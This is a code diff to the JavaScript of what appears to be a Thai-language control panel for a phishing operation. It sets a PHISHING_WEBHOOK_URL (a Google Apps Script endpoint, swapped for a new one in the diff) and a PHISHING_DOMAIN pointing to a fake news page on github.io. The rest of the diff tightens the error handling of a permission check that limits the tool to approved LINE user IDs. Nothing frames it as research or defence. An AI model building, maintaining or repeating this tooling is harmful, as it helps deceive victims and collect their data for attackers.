@@ -741,7 +741,7 @@
         
         // URL สำหรับ webhook
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby5eHSqrsAawgCB6D8_tXfzXgXzuxKxUndeapxhZh3qaIs8RdA-cEij0gmRAUCQApcl/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby7Y2MhTtmlyJs-wyuIzMHjlMRyKMeYSlhsZDQNP9g1-O9Kc99bqEM5od6LcCUCmc2v/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -826,33 +826,52 @@
                     })
                 });
                 
+                const responseText = await response.text(); // Get raw response text first
+                console.log("Raw response from permission check:", responseText);
+
+                if (!response.ok) {
+                    console.error(`Permission check failed with status: ${response.status}`);
+                    console.error("Response body:", responseText);
+                    // Consider using fallback only on specific errors if needed
+                    return checkUserPermissionFallback(userId); 
+                }
+
                 try {
-                    const contentType = response.headers.get("content-type");
-                    if (contentType && contentType.includes("application/json")) {
-                        const data = await response.json();
-                        console.log("ผลการตรวจสอบสิทธิ์:", data);
-                        return data.hasPermission === true;
+                    const data = JSON.parse(responseText); // Try parsing the text
+                    console.log("ผลการตรวจสอบสิทธิ์ (Parsed JSON):", data);
+                    
+                    // Explicitly check for the hasPermission property
+                    if (typeof data.hasPermission === 'boolean') {
+                        return data.hasPermission;
                     } else {
-                        console.log("Server ไม่ได้ตอบกลับเป็น JSON, ใช้การตรวจสอบสำรอง");
-                        return checkUserPermissionFallback(userId);
+                        console.error("Response JSON does not contain 'hasPermission' boolean property.");
+                        return checkUserPermissionFallback(userId); // Fallback if format is wrong
                     }
                 } catch (e) {
                     console.error("ไม่สามารถแปลง response เป็น JSON:", e);
-                    return checkUserPermissionFallback(userId);
+                    console.error("Response text that failed parsing:", responseText);
+                    return checkUserPermissionFallback(userId); // Fallback on JSON parse error
                 }
             } catch (error) {
-                console.error('Error checking permission:', error);
+                console.error('Error checking permission via fetch:', error);
+                // Network error or other fetch-related issue, use fallback
                 return checkUserPermissionFallback(userId);
             }
         }
         
         // ตรวจสอบสิทธิ์แบบสำรอง
         function checkUserPermissionFallback(userId) {
+            console.warn("Using fallback permission check for user:", userId);
+            // IMPORTANT: This fallback should ideally be removed or secured if possible.
+            // It's generally better to rely solely on the backend check.
             const approvedUserIds = [
                 'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบ
+                // Add other known approved IDs here ONLY IF ABSOLUTELY NECESSARY for testing/fallback
             ];
             
-            return approvedUserIds.includes(userId);
+            const isApproved = approvedUserIds.includes(userId);
+            console.log("Fallback check result:", isApproved);
+            return isApproved;
         }
         
         // เปิดใช้งานฟอร์ม
